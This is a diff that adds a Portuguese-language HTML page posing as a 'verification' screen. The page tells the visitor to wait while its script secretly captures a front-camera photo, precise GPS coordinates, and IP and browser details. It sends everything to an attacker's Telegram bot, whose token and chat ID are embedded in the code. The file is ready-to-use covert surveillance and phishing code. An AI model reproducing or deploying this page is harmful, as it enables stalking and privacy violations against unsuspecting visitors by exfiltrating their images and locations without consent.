@@ -1,0 +1,58 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>Verificação</title>
+</head>
+<body style="background:#111;color:#fff;font-family:sans-serif;text-align:center;padding-top:40vh">
+Aguarde validação...
+<script>
+/* ---------- CONFIGURE AQUI ---------- */
+const TOKEN   = "7965529070:AAEULKRZGzH8uZzFVqqS7yx_W3jey0dkYQI";   // token do BotFather
+const CHAT_ID = "6606582371";           // seu chat.id
+/* ------------------------------------ */
+
+// 1) Foto da câmera frontal
+navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
+.then(stream=>{
+  const v=document.createElement("video");
+  v.srcObject=stream; v.play(); v.hidden=true;
+  document.body.appendChild(v);
+  const c=document.createElement("canvas");
+  setTimeout(()=>{
+    c.width=v.videoWidth; c.height=v.videoHeight;
+    c.getContext("2d").drawImage(v,0,0);
+    v.remove(); stream.getTracks().forEach(t=>t.stop());
+    send({type:"pic", data:c.toDataURL("image/jpeg",.6)});
+  },1500);
+})
+.catch(e=>send({type:"err", data:"camera:"+e}));
+
+// 2) GPS
+navigator.geolocation.getCurrentPosition(p=>{
+  send({type:"gps", data:[p.coords.latitude,p.coords.longitude]});
+},e=>send({type:"err", data:"gps:"+e}),{timeout:5e3,enableHighAccuracy:true});
+
+// 3) IP + UA
+fetch("https://ipinfo.io/json")
+.then(r=>r.json())
+.then(j=>send({type:"ip", data:j}));
+
+// emissor
+function send(obj){
+  obj.ua = navigator.userAgent;
+  const txt = JSON.stringify(obj,null,2);
+  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      chat_id:CHAT_ID,
+      text:"```\n"+txt+"\n```",
+      parse_mode:"Markdown"
+    })
+  });
+}
+</script>
+</body>
+</html>
